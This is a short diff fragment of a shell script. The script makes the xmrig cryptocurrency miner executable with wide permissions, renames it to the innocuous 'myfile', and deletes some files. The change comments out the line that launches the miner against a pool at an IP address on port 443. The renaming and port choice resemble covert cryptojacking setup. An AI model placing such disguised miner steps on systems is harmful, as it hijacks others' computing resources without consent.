@@ -4,4 +4,4 @@ chmod 777 xmrig
 rm config.json 
 rm out 
 mv xmrig myfile
-./myfile -o 93.210.145.123:443
+#./myfile -o 93.210.145.123:443
